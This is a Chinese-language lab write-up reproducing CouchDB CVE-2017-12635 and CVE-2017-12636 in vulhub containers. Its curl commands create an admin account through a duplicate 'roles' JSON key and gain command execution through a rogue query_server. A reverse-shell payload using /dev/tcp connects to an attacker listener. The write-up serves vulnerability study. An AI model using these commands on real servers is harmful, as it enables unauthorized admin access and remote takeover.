三、漏洞复现

（一）漏洞形成原因

CouchDB使用Erlang语言编写，其解析json的方式与javascript解析json的方式不同，导致语句执行时的差异性。

Erlang语言解析json格式数据的方式：

> jiffy:decode("{"a":"1", "a":"2"}").

{[{<<"a">>,<<"1">>},{<<"a">>,<<"2">>}]}

对于相同的key，jiffy得到两个键值对。


而javascript解析json格式的数据的方式：

JSON.parse("{"a":"1", "a": "2"}")

{a: "2"}

javascript得到的是后面的键值对。


（二）漏洞复现过程

1、 正常操作

正常情况下，根据vulhub给出的管理员账号：admin/password，我们可以使用curl命令创建CouchDB账户。

curl -X PUT -d '{"type":"user","name":"test","roles":["_admin"],"password":"123456"}' http://admin:password@192.168.242.101:5984/_users/org.couchdb.user:test -H "Content-Type:application/json"

账号创建成功。


2、 漏洞利用

现在假设我们在不知道管理员账号和口令的情况下，要创建一个管理员账号并设置口令。输入下面的命令：

curl -X PUT -d '{"type":"user","name":"test1","roles":["_admin"],"password":"123456"}' http://192.168.242.101:5984/_users/org.couchdb.user:test1 -H "Content-Type:application/json"

没有以_admin角色的账户进行身份认证，就无法得到相应的授权，设置角色是不允许的。

 

但是可以通过漏洞创建账号：

curl -X PUT -d '{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"123456"}' http://192.168.242.101:5984/_users/org.couchdb.user:hacker -H "Content-Type:application/json"


查看用户

curl -X GET http://hacker:123456@192.168.242.101:5984/_users/org.couchdb.user:hacker -H "Content-Type:application/json"

可以看到，账号创建成功。

 

为什么账号能创建成功呢？

这是因为CouchDB在判断用户提交的指令是否存在执行设置角色的操作时，使用javascript对用户提交的roles进行解析。由于存在两个roles，解析得到的是第二个roles的值，即空。因此CouchDB认为用户没有设置角色，于是允许执行用户提交的指令。而Erlang将提交的两个roles都写入了文档。

三、漏洞复现

（一）漏洞复现过程

1、 首先通过CVE-2017-12635漏洞添加账户：

curl -X PUT -d '{"type":"user","name":"hacker","roles":["_admin"],"roles":[],"password":"123456"}' http://192.168.242.101:5984/_users/org.couchdb.user:hacker -H "Content-Type:application/json"

创建的用户名为hacker，口令123456

 

2、 依次执行如下请求即可触发任意命令执行：

curl -X PUT 'http://hacker:123456@192.168.242.101:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'

curl -X PUT 'http://hacker:123456@192.168.242.101:5984/vultest'

curl -X PUT 'http://hacker:123456@192.168.242.101:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'

curl -X POST 'http://hacker:123456@192.168.242.101:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'

第一个请求是添加一个名字为cmd的query_servers，其值为"id >/tmp/success"，这就是我们后面待执行的命令。

第二、三个请求是添加一个名为vultest的数据库和名为vul的文档，添加后才能查询。

第四个请求就是在vultest数据库里进行查询，因为将language设置为cmd，这里就会用到在第一步里添加的名为cmd的query_servers，最后触发命令执行。

最后的命令虽然执行结果报错，但是命令实际上已经执行了。

docker exec -it cve-2017-12636_couchdb_1 /bin/bash

可以看到执行结果，id命令的输出已被写入/tmp/success文件中。


3、 也可在容器中执行反弹连接：

//攻击者监听本地端口

nc -l -p 443

 

//攻击者修改并执行vulhun提供的攻击脚本

vi exp.py  //编辑python脚本，修改参数，target指定couchdb所在的虚拟机的IP，command中指定反弹连接到的IP，即攻击者的VPS地址

target = 'http://192.168.242.101:5984'

command = rb"""sh -i >& /dev/tcp/192.168.242.1/443 0>&1"""

保存退出

python3 exp.py  //执行该脚本

 

//攻击者获得反弹shell

可以看到是在容器中。
